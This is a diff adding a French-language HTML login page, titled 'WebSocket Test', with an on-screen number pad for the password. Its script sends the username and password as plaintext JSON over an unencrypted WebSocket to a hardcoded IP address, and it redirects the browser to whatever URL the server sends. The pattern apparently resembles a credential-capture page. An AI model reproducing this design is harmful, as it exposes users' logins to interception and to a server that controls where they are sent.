@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebSocket Test</title>
+    <style>
+        /* CSS styles go here */
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            /* Background image */
+            background-image: url('image/apple5.jpg');
+            /* Replace with the path to your image */
+            background-size: cover;
+            /* Cover the viewport */
+            background-position: center;
+            /* Center the image */
+            height: 100vh;
+            /* Full height */
+            display: flex;
+            align-items: center;
+            /* Center content vertically */
+            justify-content: center;
+            /* Center content horizontally */
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: none;
+            outline: none;
+        }
+
+        .login-box {
+            background-color: rgba(255, 255, 255, 0.3);
+            /* White with 0.5 opacity */
+            padding: 20px;
+            border-radius: 15px;
+            /* Optional: Soft shadow for depth */
+            width: 80%;
+            /* Take 80% width of parent, can adjust based on your needs */
+            max-width: 400px;
+            /* Maximum width */
+        }
+
+        form#loginForm input[type="text"],
+        form#loginForm input[type="password"] {
+            background: none;
+            border: nono;
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-bottom: 1px solid white;
+            outline: none;
+            font-size: 16px;
+            color: white;
+        }
+
+        form#loginForm input[type="text"]::placeholder,
+        form#loginForm input[type="password"]::placeholder {
+            color: white;
+            /* Slightly faded */
+        }
+
+        .login {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 16px;
+            background-color: #FFBF00;
+            /* A blue color, you can change it */
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .number-pad {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            width: 220px;
+            /* Assuming each circle is 50px in width, 4*50 + margins */
+        }
+
+        .number {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            /* Makes it a circle */
+            background-color: #f0f0f0;
+            /* A light grey background */
+            border: none;
+            margin: 5px;
+            font-size: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            /* This centers the number in the circle */
+            cursor: pointer;
+            outline: none;
+        }
+
+        .number:hover {
+            background-color: #FFBF00;
+            /* A bit darker on hover */
+        }
+
+        .box {
+            display: flex;
+            justify-content: center;
+            /* Centers content horizontally */
+            align-items: center;
+            /* Centers content vertically */
+            height: 100%;
+            /* Adjust this to your needs. For instance, if the box should fill the viewport, you'd use height: 100vh; */
+            width: 100%;
+            /* Adjust this to your needs. For example, if the box should fill the entire width, it can remain as 100%. */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-box">
+        <form id="loginForm">
+            <p style="color:white"><b>Authentification</b></p>
+            <input type="text" id="username" placeholder="Utilisateur" required>
+            <input type="password" id="passwordInput" placeholder="Mot de passe" readonly>
+            <div class="box">
+                <div class="number-pad">
+                    <button type="button" class="number" data-number="0">0</button>
+                    <button type="button" class="number" data-number="1">1</button>
+                    <button type="button" class="number" data-number="2">2</button>
+                    <button type="button" class="number" data-number="3">3</button>
+                    <br>
+                    <button type="button" class="number" data-number="4">4</button>
+                    <button type="button" class="number" data-number="5">5</button>
+                    <button type="button" class="number" data-number="6">6</button>
+                    <button type="button" class="number" data-number="7">7</button>
+                    <button type="button" class="number" data-number="8">8</button>
+                    <button type="button" class="number" data-number="9">9</button>
+                    <br>
+                    <span id="clearIcon" class="number">✖</span>
+                </div>
+            </div>
+            <input type="button" class="login" id="loginButton" value="Connexion">
+        </form>
+    </div>
+
+    <script>
+        const socket = new WebSocket('ws://206.166.251.33:80');
+
+        socket.addEventListener('open', (event) => {
+            console.log('Connected to WebSocket server');
+        });
+
+        const inputElement = document.getElementById('textInput');
+        let isTypingSent = false;
+
+
+        socket.addEventListener('close', (event) => {
+            console.log('Disconnected from WebSocket server');
+        });
+
+        document.addEventListener("DOMContentLoaded", function () {
+            const passwordInput = document.getElementById('passwordInput');
+
+            // Handle button click
+            function handleButtonClick(event) {
+                // Append the clicked number to the password input's value
+                passwordInput.value += event.target.textContent;
+            }
+
+            // Add event listeners to each button
+            const buttons = document.querySelectorAll('.number');
+            buttons.forEach(button => {
+                button.addEventListener('click', handleButtonClick);
+            });
+        });
+
+
+        document.addEventListener("DOMContentLoaded", function () {
+            // Previous JavaScript code...
+
+            const clearIcon = document.getElementById('clearIcon');
+            clearIcon.addEventListener('click', function () {
+                passwordInput.value = ''; // Clear the input
+            });
+        });
+
+        document.getElementById('loginButton').addEventListener('click', function () {
+            // Send the username and password as a JSON string to the WebSocket server
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('passwordInput').value;
+
+            socket.send(JSON.stringify({
+                type: 'login',
+                username: username,
+                password: password
+            }));
+
+
+        });
+
+        // Listen for messages from the server
+        socket.addEventListener('message', function (event) {
+            const data = JSON.parse(event.data);
+
+            if (data.type === 'navigate') {
+                window.location.href = data.url;  // Redirect to the provided URL
+            }
+        });
+
+    </script>
+</body>
+
+</html>
